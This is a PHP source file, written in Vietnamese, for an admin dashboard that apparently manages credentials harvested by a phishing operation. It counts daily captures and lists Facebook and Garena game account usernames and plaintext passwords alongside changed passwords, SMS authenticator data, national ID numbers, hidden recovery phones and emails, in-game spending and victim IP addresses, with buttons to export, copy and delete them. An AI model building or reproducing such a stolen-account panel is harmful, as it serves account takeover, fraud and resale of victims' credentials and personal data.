<?php
require_once ('Head.php');
require_once ('Session.php');
require_once ('Config.php');
?>  
<?php date_default_timezone_set('Asia/Ho_Chi_Minh'); 
$TimeToday = date("d/m");    

// Start Time today
$FBToDay = $ConnectData->
query("SELECT COUNT(*) FROM acc WHERE `time` LIKE '%{$TimeToday}%'")->fetch_array();
$ALLGarenaToDay = $ConnectData->
query("SELECT COUNT(*) FROM account_main WHERE `time` LIKE '%{$TimeToday}%'")->fetch_array();
$AuthenToDay = $ConnectData->
query("SELECT COUNT(*) FROM account_sms WHERE `time` LIKE '%{$TimeToday}%'")->fetch_array();
$TTT_ToDay = $ConnectData->
query("SELECT COUNT(*) FROM account_ttt WHERE `time` LIKE '%{$TimeToday}%'")->fetch_array();
$LoiPassToDay = $ConnectData->
query("SELECT COUNT(*) FROM account_loi WHERE `time` LIKE '%{$TimeToday}%'")->fetch_array();
// End Time Today
// Start Fetch_Array Account
$FB = $ConnectData->
query("SELECT COUNT(*) FROM acc")->fetch_array();
$ALLGA = $ConnectData->
query("SELECT COUNT(*) FROM account_main")->fetch_array();
$AUTHEN = $ConnectData->
query("SELECT COUNT(*) FROM account_sms")->fetch_array();
$TTT = $ConnectData->
query("SELECT COUNT(*) FROM account_ttt")->fetch_array();
$LOI = $ConnectData->
query("SELECT COUNT(*) FROM account_loi")->fetch_array();
?>


<body>  
 <div class="col-md-12">
     
<form method="POST">
<b>
<script>
    document.addEventListener("DOMContentLoaded", () => {
    const SAVING_MESSAGE = "Xin chờ...";
    const SAVED_MESSAGE = "";
    
    document
    .querySelectorAll(".autosave-message")
    .forEach((el) => (el.textContent = SAVED_MESSAGE));
    
    document.querySelectorAll("[data-autosave-url]").forEach((inputField) => {
    inputField.addEventListener("change", async () => {
    const name = inputField.getAttribute("name");
    const value = inputField.value;
    const url = inputField.dataset.autosaveUrl;
    const autosaveMessageEl = inputField
    .closest(".container")
    .querySelector(".autosave-message");
    const formData = new FormData();
    
    formData.append(name, value);
    autosaveMessageEl.classList.add("autosave-message--saving");
    autosaveMessageEl.textContent = SAVING_MESSAGE;
    
    const response = await fetch(url, {
    method: "POST",
    body: formData
    });
    
    autosaveMessageEl.classList.remove("autosave-message--saving");
    autosaveMessageEl.textContent = SAVED_MESSAGE;
    });
    });
    });
</script>        
   <a href="" class="btn btn-info">RELOAD</a><br><br>
   <a href ="../cp/ThietLapChung.php" class="btn btn-info">THIẾT LẬP CHUNG</a><br><br>
                      
     
    <br>
<h3>Thống kê ngày: <?= $TimeToday;?></h3>
<b>FACEBOOK:</b> <?=$FBToDay[0];?> <br>
<b>ALL GARENA:</b> <?=$ALLGarenaToDay[0];?>  <br>
<b>AUTHEN GARENA:</b> <?=$AuthenToDay[0];?> <br>
<b>TTT GARENA: </b><?=$TTT_ToDay[0];?> <br>
<b>LỖI GARENA: </b><?=$LoiPassToDay[0];?> <br>
<?php 
$AccFb = $ConnectData->
query("SELECT COUNT(*) FROM acc")->fetch_array();
$AccALLGas   = $ConnectData->
query("SELECT COUNT(*) FROM account_main")->fetch_array();
$AccAuthen   = $ConnectData->
query("SELECT COUNT(*) FROM account_sms")->fetch_array();
$AccTTT      = $ConnectData->
query("SELECT COUNT(*) FROM account_ttt")->fetch_array();
$AccLoi      = $ConnectData->
query("SELECT COUNT(*) FROM account_loi")->fetch_array();

?> 
    
    
    
    
   <br>





   
   <table id="example1" class="table table-bordered table-striped" style="width:100%">
      <thead>
         <tr>
            <th>Loại tài khoản</th>
            <th>Xuất File</th>
            <th>Thao Tác</th>
         </tr>
         <tr>
            <td><input name="XemAccFB" type="submit" value="<?=$AccFb[0]?>  FB" class="btn btn-primary"></td>
            <td><a href="../cp/XuatTxtAccount.php?XuatAccFacebook" class="btn btn-success">XUẤT FB</a></td>
            <td> <a onclick="DeleteAllFacebook()" class="btn btn-warning">XOÁ ALL </a><br></td>
         </tr>
         <tr>
            <td><input name="XemGasTong" type="submit" value="<?=$AccALLGas[0]?> TỔNG GAS" class="btn btn-danger"></td>
            <td><a href="../cp/XuatTxtAccount.php?XuatAccGasTong" class="btn btn-success">XUẤT ALL GAS</a></td>
            <td><a onclick="DeleteAllGas()" class="btn btn-warning"> XOÁ ALL</a></td>
         </tr>
         <tr>
            <td> <input name="XemGasAuthen" type="submit" value="<?=$AccAuthen[0]?>  GAS AUTHEN" class="btn btn-danger"></td>
            <td><a href="../cp/XuatTxtAccount.php?XuatAccGasAuthen" class="btn btn-success">XUẤT AUTHEN</a></td>
            <td><a onclick="DeleteAllGasAuthen()" class="btn btn-warning">XÓA ALL</a></td>
         </tr>
         <tr>
            <td><input name="XemGasTrangThongTin" type="submit" value="<?=$AccTTT[0]?> GAS TRẮNG" class="btn btn-danger"></td>
            <td> <a href="../cp/XuatTxtAccount.php?XuatAccGasTTT" class="btn btn-success">XUẤT GAS TRẮNG</a> 
            <a href="../cp/View_Account_TTT.php" class="btn btn-danger">PHÂN LOẠI ACCOUNT</a></td>
            <td><a onclick="DeleteAllGasTTT()" class="btn btn-warning">XOÁ ALL</a>

            </td>
            <tr>
            <td><input name="XemGasLoiPassword" type="submit" value="<?=$AccLoi[0]?> GAS LỖI" class="btn btn-danger"></td>
            <td><a href="../cp/XuatTxtAccount.php?XuatAccGasLoiPassword" class="btn btn-success">XUẤT GAS LỖI PASSWORD</a></td>
            <td><a onclick="DeleteAllGasLoiPassword()" class="btn btn-warning">XOÁ ALL</a>  </td>
            </tr>
    </thead>
    </tbody>
    </table>  

<script>
function copyTo(input) {
  input.select();
  document.execCommand("copy");
}
</script>      
</b>
</b>
</form> 
<script src="../cp/theme/xulydelete.js"></script>
       
         <br>
         <?php
        if (isset($_POST["XemAccFB"]))
        {

            $XemAccFb = mysqli_query($ConnectData, "SELECT * FROM acc ORDER BY id DESC");
?>
<h4>BẠN ĐANG XEM TÀI KHOẢN FACEBOOK</h4>

         <table id="example1" class="table table-bordered table-striped">
            <thead>
               <tr>
                  <th>TK|MK  </th>
                  
                  <th>IP</th>
                  <th>Time</th>
                  <th>Thao Tác</th>
               </tr>
            </thead>
            <tbody>
               <?php mysqli_set_charset($ConnectData, 'UTF-8');
            while ($row = mysqli_fetch_assoc($XemAccFb))
            {
?>
               <tr>
                  <td class="table-active"><?=$row['username']; ?>|<?=$row['password']; ?></td>
                  <td><?=$row['ip']; ?></td>
                  <td><?=$row['time']; ?></td>
                
                  <td>
        <a href="/deleteaccount?ApiDeleteUserFacebook&id=<?php echo $row['id']; ?>" class='btn btn-danger btn-sm'>Delete</a>                
                  </td>
               </tr>
               <?php
            }
        
    } ?>
            </tbody>
         </table>
      
  
         
   
    <span class="container">
<span class="autosave-message">
    
</span>
 
         
         
          
         <?php
    if (isset($_POST["XemGasTong"]))
    {

        $see = mysqli_query($ConnectData, "SELECT * FROM account_main ORDER BY id DESC");
?>
<h4>BẠN ĐANG XEM TỔNG GARENA</h4>                                
         <table id="example1" class="table table-bordered table-striped">
            <thead>
               <tr>
                  <th>Tài khoản|Mật khẩu </th>
                  <th>SDT Ẩn</th>
                  <th>Mail Ẩn</th>
                  <th>Level</th>
                  <th>Tướng</th>
                  <th>FB</th>
                  <th>CMND</th>
                  <th>Email</th>
                  <th>QH đã nạp</th>
                  <th>Ghi chú</th>
                  <th>Thời gian</th>
                  <th>Thao tác</th>
               </tr>
            </thead>
            <tbody>
               <?php mysqli_set_charset($ConnectData, 'UTF-8');
        while ($row = mysqli_fetch_assoc($see))
        {

?>
               <tr>
                  <td><?=$row['user']; ?>|<?=$row['pass']; ?></td>
                  <td><?=$row['sdtz']; ?></td>
                  <td><?=$row['mailz']; ?></td>
                  <td><?=$row['level']; ?></td>
                  <td><?=$row['sotuong']; ?></td>
                  <td><?=$row['fb']; ?></td>
                  <td><?=$row['cmnd']; ?></td>
                  <td><?=$row['email']; ?></td>
                  <td><?=$row['quanhuy']; ?></td>
                  <td>
                      
     <input type="text" name="NoteAccountTong" id="username" value="<?=$row['note']; ?>" autofocus data-autosave-url="../cp/XuLyNote.php?id=<?=$row['id']?>">
</span>       
                 </td>
                  <td><?=$row['time']; ?></td>
                  <td>
                     <a href="/deleteaccount?ApiDeleteUserTongGas&id=<?php echo $row['id']; ?>" class='btn btn-danger btn-sm'>Delete</a>                
                  </td>
               </tr>
               <?php
        } ?>
            </tbody>
         </table>
         <?php
    } ?>
    
         <?php
    if (isset($_POST["XemGasAuthen"]))
    {

        $see = mysqli_query($ConnectData, "SELECT * FROM account_sms ORDER BY id DESC ");
?>
<h4>BẠN ĐANG XEM ACC GAS AUTHEN</h4>
         <table id="example1" class="table table-bordered table-striped">
            <thead>
               <tr>
                  <th>Tài khoản</th>
                  <th>Mật khẩu</th>
                  <th>Authen</th>
                  <th>Level</th>
                  <th>Tướng</th>
                  <th>FB</th>
                  <th>CMND</th>
                  <th>Email</th>
                  <th>QH đã nạp</th>
                  <th>Ghi Chú</th>
                  <th>Thời gian</th>
                  <th>Thao tác</th>
               </tr>
            </thead>
            <tbody>
                
      
           
               <?php
        while ($row = mysqli_fetch_assoc($see))
        {

?>       
               <tr>
                  <td><input type="text" value="<?=$row['user']; ?>" onclick="copyTo(this)"></td>
                     <td><input type="text" value="<?=$row['pass']; ?>" onclick="copyTo(this)"></td>
                  <td><input type="text" value="<?=$row['sdt']; ?>" onclick="copyTo(this)"></td>
                  <td><?=$row['level']; ?></td>
                  <td><?=$row['sotuong']; ?></td>
                   <td><?=$row['fb']; ?></td>
                  <td><?=$row['cmnd']; ?></td>
                  <td><?=$row['email']; ?></td>
                  <td><?=$row['quanhuy']; ?></td>
                  <td><input type="text" name="NoteAccountAuthen" id="username" value="<?=$row['note']; ?>" autofocus data-autosave-url="../cp/XuLyNote.php?id=<?=$row['id']?>"></td>
                  <td><?=$row['time']; ?></td>
                  <td>
             <a href="/deleteaccount?ApiDeleteUserGasAuthen&id=<?php echo $row['id']; ?>" class='btn btn-danger btn-sm'>Delete</a>                
                  </td>
               </tr>
               <?php
        } ?>
            </tbody>
         </table>
         <?php
    } ?>
         <?php
    if (isset($_POST["XemGasTrangThongTin"]))
    {

        $see = mysqli_query($ConnectData, "SELECT * FROM account_ttt ORDER BY id DESC");
?>
           <h4>BẠN ĐANG XEM ACC GAS TRẮNG THÔNG TIN</h4>
         <table id="example1" class="table table-bordered table-striped">
            <thead>
               <tr>
                  <th>Tài khoản|Mật khẩu cũ</th>
                  <th>Mật khẩu mới</th>
                  <th>Level</th>
                  <th>Tướng</th>
                  <th>FB</th>
                  <th>CMND</th>
                  <th>QH đã nạp</th>
                  <th>Ghi chú</th>
                  <th>Thời gian</th>
                  <th>Thao tác</th>
               </tr>
            </thead>
            <tbody>
               <?php
        while ($row = mysqli_fetch_assoc($see))
        {

?>
               <tr>
                  <td><input type="text" value="<?=$row['user']; ?>|<?=$row['passnew']; ?>" onclick="copyTo(this)"></td>
                  <td><?=$row['pass']; ?></td>
                  <td><?=$row['level']; ?></td>
                  <td><?=$row['sotuong']; ?></td>
                  <td><?=$row['fb']; ?></td>
                  <td><?=$row['cmnd']; ?></td>
                  <td><?=$row['quanhuy']; ?></td>
                  <td><input type="text" name="NoteAccountTTT" id="username" value="<?=$row['note']; ?>" autofocus data-autosave-url="../cp/XuLyNote.php?id=<?=$row['id']?>"></td>
                  <td><?=$row['time']; ?></td>
                  <td>
                     <a href="/deleteaccount?ApiDeleteUserGasTTT&id=<?php echo $row['id']; ?>" class='btn btn-danger btn-sm'>Delete</a>                
                  </td>
               </tr>
               <?php
        }

    }
?>
            </tbody>
         </table>
         <?php
    if (isset($_POST["XemGasLoiPassword"]))
    {

?>
         <?php
        $see = mysqli_query($ConnectData, "SELECT * FROM account_loi ORDER BY id DESC"); ?>
       <h4>BẠN ĐANG XEM ACC GAS LỖI PASSWORD</h4>
         <table id="example1" class="table table-bordered table-striped">
            <thead>
               <tr>
                  <th>Tài khoản|Mật khẩu</th>
                  <th>Level</th>
                  <th>Tướng</th>
                  <th>FB</th>
                  <th>CMND</th>
                  <th>QH đã nạp</th>
                  <th>Ghi chú</th>
                  <th>Thời gian</th>
                  <th>Thao tác</th>
               </tr>
            </thead>
            <tbody>
               <?php
        while ($row = mysqli_fetch_assoc($see))
        {

?>
               <tr>
                  <td><input type="text" value="<?=$row['user']; ?>|<?=$row['pass']; ?>" onclick="copyTo(this)"></td>
                  <td><?=$row['level']; ?></td>
                  <td><?=$row['sotuong']; ?></td>
                  <td><?=$row['fb']; ?></td>
                  <td><?=$row['cmnd']; ?></td>
                  <td><?=$row['quanhuy']; ?></td>
                  <td><input type="text" name="NoteAccountLoiPass" id="username" value="<?=$row['note']; ?>" autofocus data-autosave-url="../cp/XuLyNote.php?id=<?=$row['id']?>"></td>
                  <td><?=$row['time']; ?></td>
                  <td>
                     <a href="/deleteaccount?ApiDeleteUserGasLoiPass&id=<?php echo $row['id']; ?>" class='btn btn-danger btn-sm'>Delete</a>                
                  </td>
               </tr>
               <?php
        } ?>
            </tbody>
         </table>
        
         <?php
    
}
?>
